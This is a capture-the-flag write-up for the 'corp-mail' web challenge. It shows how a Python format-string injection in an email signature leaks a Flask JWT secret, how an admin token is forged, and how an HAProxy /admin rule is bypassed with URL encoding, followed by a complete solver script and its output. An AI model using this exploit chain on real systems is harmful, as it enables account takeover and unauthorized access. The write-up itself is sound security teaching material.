@@ -1,0 +1,398 @@
+## Web — corp-mail
+
+Author: **lordrukie x beluga**
+
+Rumor said that my office's internal email system was breached somewhere... must've been the wind.
+
+**TL;DR**
+
+1. SSTI in email signature → get jwt secret
+2. Forge jwt cookie → get role admin 
+3. SSRF to bypass HAProxy restriction → access `/admin/email/5` → flag
+
+**FLAG**
+
+`C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_5cedb47e73ca}`
+
+**Exploration**
+
+nice n easy chall
+
+with web challs i like to first explore the features of the web right away
+
+basically we are given a web app where employees can send emails to other employees
+
+![image.png](images/image%201.png)
+
+there’s also a feature to add signature to ur email, in the image below i tried to use the variables `{username} {date}` as my signature and after saving, the current signature is changed to my username `test`  and the current date. 
+
+![image.png](images/image%202.png)
+
+now looking at the source code, we know that this feature is vulnerable to ssti and can be abused to find the app secret key
+
+in `utils.py`  it uses `.format()`  on `signature_template` which takes input from user and also passes `app=current_app` to the formatting context.  
+
+<aside>
+💡
+
+the `.format()` method in python allows for attribute access using dot notation
+
+</aside>
+
+so as a user, the .format() call will let us get the config attribute 
+
+utils.py:
+
+```python
+def format_signature(signature_template, username):
+    now = datetime.now()
+    try:
+        return signature_template.format(
+            username=username,
+            date=now.strftime('%Y-%m-%d'),
+            app=current_app
+        )
+    except (KeyError, IndexError, AttributeError, ValueError):
+        return signature_template
+```
+
+config.py
+
+```python
+import os
+
+def configure_app(app):
+    """Configure the Flask application."""
+    app.secret_key = os.environ.get('SECRET_KEY', 'dev_key_only_for_local_testing')
+    app.config['JWT_SECRET'] = os.environ.get('JWT_SECRET', 'dev_jwt_secret_only_for_local_testing')
+    app.config['JWT_ALGORITHM'] = 'HS256'
+    app.config['DATABASE'] = '/app/data/corporate.db'
+```
+
+lets dump the `app.secret_key` and `app.config` , we can do this by passing `{app.config){app.secret_key}` in `signature`
+
+![image.png](images/image%203.png)
+
+html decoded: 
+
+```python
+<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'b24e4c17fce8e010ef0ac7cefe0192daff97ceb0aa21864f0772d0d172dfa6d8', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'JWT_SECRET': '087894111ff1df544004d97c35528eb819c80b4ffe0232b5d1d272ef8b05a646', 'JWT_ALGORITHM': 'HS256', 'DATABASE': '/app/data/corporate.db'}>b24e4c17fce8e010ef0ac7cefe0192daff97ceb0aa21864f0772d0d172dfa6d8
+```
+
+with the jwt secret, we can forge the jwt cookie and change our role by changing `“is_admin”:1`
+
+![image.png](images/image%204.png)
+
+now although we are admin, there is a proxy that we need to bypass
+
+haproxy.cfg:
+
+```python
+global
+    log stdout format raw local0
+    maxconn 4096
+
+defaults
+    log     global
+    mode    http
+    option  httplog
+    option  dontlognull
+    timeout connect 5000ms
+    timeout client  50000ms
+    timeout server  50000ms
+
+frontend http_front
+    bind *:80
+    default_backend flask_backend
+
+backend flask_backend
+    http-request deny if { path -i -m beg /admin }
+    server flask1 127.0.0.1:5000 check
+```
+
+this config has the rule `http-request deny if { path -i -m beg /admin }` which basically denies requests that begins with `/admin` 
+
+to bypass this check we can simply url encode `/admin` to its hex value so it became `/%61%64%6d%69%6e` → flask then automatically decodes this url and serve the admin page
+
+flag located in one of the admin emails 
+
+```python
+def _seed_database(db):
+    """Seed the database with initial test data."""
+    flag = os.environ.get('FLAG', 'C2C{fake_flag_for_local_testing}')
+    
+    <snip>
+    test_emails = [
+        <snip>
+	    (admin_id, mike_id, "Confidential: System Credentials",         f"Hi Mike,\n\nAs requested, here are the backup system credentials for the security audit:\n\nSystem: Backup Server\nAccess Code: {flag}\n\nPlease keep this information secure and delete this email after noting the details.\n\nBest regards,\nIT Administration"),
+```
+
+found the flag at `/admin/email/5`
+
+![image.png](images/image%205.png)
+
+**Exploit script to reproduce**
+
+this was first generated by ai agent and some parts were edited manually
+
+```python
+import requests
+import re
+import datetime
+import sys
+import hmac
+import hashlib
+import base64
+import json
+import html
+
+# Custom JWT implementation to avoid dependency issues
+def base64url_encode(input_val):
+    if isinstance(input_val, str):
+        input_val = input_val.encode('utf-8')
+    return base64.urlsafe_b64encode(input_val).decode('utf-8').rstrip('=')
+
+def create_jwt(payload, secret):
+    header = {"typ": "JWT", "alg": "HS256"}
+    # Use compact separators to match standard JWT (no spaces)
+    header_enc = base64url_encode(json.dumps(header, separators=(',', ':')))
+    
+    def json_serial(obj):
+        if isinstance(obj, (datetime.datetime, datetime.date)):
+            return int(obj.timestamp())
+        raise TypeError (f"Type {type(obj)} not serializable")
+        
+    # Use compact separators for payload too
+    payload_enc = base64url_encode(json.dumps(payload, default=json_serial, separators=(',', ':')))
+    msg = f"{header_enc}.{payload_enc}"
+    signature = hmac.new(secret.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).digest()
+    sig_enc = base64url_encode(signature)
+    return f"{msg}.{sig_enc}"
+
+# Target URL
+# BASE_URL = "http://localhost:9090" 
+BASE_URL = "http://challenges.1pc.tf:48351" # Update as needed
+
+# 1. Register and Login
+session = requests.Session()
+# Use random username to avoid conflicts on repeated runs
+import random
+import string
+suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+username = f"attacker_{suffix}"
+password = "password123"
+email = f"attacker_{suffix}@corpmail.local"
+
+print(f"[*] Registering user {username}...")
+r = session.post(f"{BASE_URL}/register", data={
+    "username": username,
+    "email": email,
+    "password": password,
+    "confirm_password": password
+})
+
+if "Registration successful" not in r.text and r.status_code != 200:
+   print(f"[-] Registration might have failed. Status: {r.status_code}")
+
+print(f"[*] Logging in...")
+r = session.post(f"{BASE_URL}/login", data={
+    "username": username,
+    "password": password
+})
+
+# Check login
+if "Invalid credentials" in r.text or "Login" in r.text:
+    print("[-] Login failed")
+    sys.exit(1)
+
+# 2. Inject Payload to get Secret
+print(f"[*] Injecting payload to extract JWT_SECRET...")
+r = session.post(f"{BASE_URL}/settings", data={
+    "signature": "{app.config}"
+})
+
+# Extract Secret from the page content (html decoded)
+decoded_text = html.unescape(r.text)
+
+# Looking for 'JWT_SECRET': '...'
+match = re.search(r"'JWT_SECRET': '([^']+)'", decoded_text)
+if not match:
+    # Try alternate quote style 
+    match = re.search(r"'JWT_SECRET':\s*['\"]([^'\"]+)['\"]", decoded_text)
+
+if not match:
+    print("[-] Failed to extract JWT_SECRET")
+    print("DEBUG: Response text snippet:")
+    print(r.text[:500])
+    sys.exit(1)
+
+jwt_secret = match.group(1)
+print(f"[+] Found JWT_SECRET: {jwt_secret}")
+
+# 3. Forge Admin Token
+print(f"[*] Forging Admin Token...")
+# Use UTC timestamp for exp, cast to int for standard JWT
+exp_timestamp = int((datetime.datetime.utcnow() + datetime.timedelta(hours=24)).timestamp())
+
+payload = {
+    'user_id': 1,
+    'username': 'admin',
+    'is_admin': 1, # Integer 1 for true
+    'exp': exp_timestamp
+}
+
+admin_token = create_jwt(payload, jwt_secret)
+print(f"[+] Forged Token: {admin_token}")
+
+# Verify token works on a non-admin path first (e.g. /settings)
+exploit_session = requests.Session()
+exploit_session.cookies.set('token', admin_token)
+
+print("[*] Verifying forged token on /settings (should act as admin user)...")
+r_verify = exploit_session.get(f"{BASE_URL}/settings")
+
+if r_verify.status_code == 200:
+    print("[+] Token works! (Settings page accessible)")
+    # Check if we see admin in the page source (Settings usually shows Acc Type)
+    if "Administrator" in r_verify.text:
+         print("    [+] Confirmed Account Type: Administrator")
+    else:
+         print("    [?] Warning: 'Administrator' not found in page. Check if token really has is_admin=1")
+else:
+    print(f"[-] Token check failed with status {r_verify.status_code}")
+    # print(r_verify.text[:200])
+
+# 4. Bypass HAProxy and Get Flag
+print(f"[*] Attempting HAProxy bypasses to access /admin/sent...")
+
+# ai was stuck here for so long i had to edit manually :V
+bypass_candidates = [
+    "/%61%64%6d%69%6e/sent",  # URL encoding 'admin'
+]
+
+found_flag = False
+
+for path in bypass_candidates:
+    target_url = f"{BASE_URL}{path}"
+    print(f"[*] Trying: {path}")
+    
+    # Manually construct request to prevent requests lib from normalizing path
+    req = requests.Request('GET', target_url)
+    prepped = exploit_session.prepare_request(req)
+    prepped.url = target_url # Force the path exactly as is
+    
+    try:
+        r = exploit_session.send(prepped)
+        print(f"    Status: {r.status_code}")
+        
+        # Check if we got the list (sent folder)
+        if "Confidential: System Credentials" in r.text:
+            print(f"[+] SUCCESS accessing sent list with path: {path}")
+            
+            # Now we need to find the ID of the email
+            # HTML structure: <tr onclick="window.location='/email/5'"> ... <td class="col-subject">Confidential: System Credentials</td>
+            
+            # Regex to find the row with the subject and capture the ID from the previous onclick
+            # We assume the onclick comes before the subject in the HTML
+            email_pattern = r"(window\.location=['\"]/email/(\d+)['\"].*?Confidential: System Credentials)"
+            
+            # Using dotall to match across newlines if needed, though usually on same line or close
+            match = re.search(email_pattern, r.text, re.DOTALL | re.IGNORECASE)
+            
+            if not match:
+                 # Fallback: looks for just the ID near the text if structure differs
+                 # Find the Subject index
+                 idx = r.text.find("Confidential: System Credentials")
+                 # Look backwards for "window.location='/email/"
+                 sub_text = r.text[max(0, idx-300):idx]
+                 id_match = re.search(r"window\.location=['\"]/email/(\d+)['\"]", sub_text)
+                 if id_match:
+                     email_id = id_match.group(1)
+                 else:
+                     print("[-] Could not parse Email ID from list page.")
+                     # print(r.text)
+                     continue
+            else:
+                email_id = match.group(2)
+            
+            print(f"[+] Found Email ID: {email_id}")
+            
+            # Now fetch the email content using the same bypass technique
+            # Path should be /admin/email/<id> but bypassed
+            # We reuse the successful 'path' prefix if it was a general /admin bypass
+            # e.g. if path was /%61dmin/sent, we want /%61dmin/email/<id>
+            
+            bypass_prefix = path.replace("/sent", "")
+            email_path = f"{bypass_prefix}/email/{email_id}"
+            email_url = f"{BASE_URL}{email_path}"
+            
+            print(f"[*] Fetching email content: {email_path}")
+            # Ensure we don't normalize the url
+            req_email = requests.Request('GET', email_url)
+            prepped_email = exploit_session.prepare_request(req_email)
+            prepped_email.url = email_url
+            r_email = exploit_session.send(prepped_email)
+            
+            if "C2C{" in r_email.text:
+                flag_match = re.search(r'C2C\{[^}]+\}', r_email.text)
+                if flag_match:
+                    print(f"\nWINNER! FLAG: {flag_match.group(0)}\n")
+                    found_flag = True
+                    break
+                else:
+                    print("[-] Flag format not found in email body.")
+                    print(r_email.text[:1000])
+            else:
+                 print("[-] Flag not found in email body response.")
+                 print(f"    Status: {r_email.status_code}")
+                 title_match = re.search(r'<title>(.*?)</title>', r_email.text, re.IGNORECASE)
+                 print(f"    Page Title: {title_match.group(1) if title_match else 'No Title'}")
+        
+        else:
+             if r.status_code == 200:
+                 print(f"[-] Status 200 but email not found in {path}")
+                 # Debug: what page is this?
+                 title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
+                 title = title_match.group(1) if title_match else "No Title"
+                 print(f"    Page Title: {title}")
+                 # Check if we are on login page
+                 if "Login" in title or "Sign In" in r.text:
+                     print("    -> Redirected to Login")
+                 elif "Inbox" in title:
+                     print("    -> Redirected to Inbox")
+                 elif "Admin" in title:
+                     print("    -> Seems to be an Admin page but email mismatch?")
+                     # print(f"    Content snippet: {r.text[:200]}...")
+
+    except Exception as e:
+        print(f"    Error: {e}")
+        import traceback
+        traceback.print_exc()
+
+if not found_flag:
+    print("[-] All bypass attempts failed.")
+```
+
+output:
+
+```python
+[*] Registering user attacker_6npp4x...
+[*] Logging in...
+[*] Injecting payload to extract JWT_SECRET...
+[+] Found JWT_SECRET: 2ee0290caa4edd33561420a043fec20eaba9219c071e1fcdfefdd6aaa8a0639d
+[*] Forging Admin Token...
+D:\cysec\CTF\2025\c2c\web\corp-mail_corp-mail-dist\solver.py:97: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  exp_timestamp = int((datetime.datetime.utcnow() + datetime.timedelta(hours=24)).timestamp())   
+[+] Forged Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cCI6MTc3MTM3ODY3OX0.dfhwTMFG77XfMEKHSYZPGZIos-vyrlatP9TvxT7StDQ
+[*] Verifying forged token on /settings (should act as admin user)...
+[+] Token works! (Settings page accessible)
+    [+] Confirmed Account Type: Administrator
+[*] Attempting HAProxy bypasses to access /admin/sent...
+[*] Trying: /%61%64%6d%69%6e/sent
+    Status: 200
+[+] SUCCESS accessing sent list with path: /%61%64%6d%69%6e/sent
+[+] Found Email ID: 5
+[*] Fetching email content: /%61%64%6d%69%6e/email/5
+
+WINNER! FLAG: C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_5cedb47e73ca}
+```
